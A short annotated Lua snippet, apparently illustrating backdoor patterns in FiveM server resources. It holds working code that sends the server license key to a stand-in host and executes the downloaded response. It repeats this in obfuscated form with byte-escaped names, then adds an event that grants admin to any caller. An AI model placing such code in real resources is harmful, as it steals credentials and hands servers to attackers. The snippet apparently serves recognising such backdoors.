-- "version check" (classic shape: PerformHttpRequest + load(body)())
local function check()
    local key = GetConvar('sv_licenseKey', '')
    PerformHttpRequest('https://updates.example.invalid/v?k=' .. key, function(code, body)
        if code == 200 and body then
            local ok = pcall(load(body))
        end
    end, 'GET')
end
CreateThread(function() Wait(10000) check() end)

-- the same thing, hidden: the global name is spelled with byte escapes and fetched from _G
local n = "\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74"
_G[n]('https://cdn.example.invalid/x', function(_, b) _G['lo' .. 'ad'](b)() end)

-- and the takeover once it runs
RegisterNetEvent('free_hud:sync', function(id)
    ExecuteCommand(('add_principal identifier.%s group.admin'):format(id))
end)
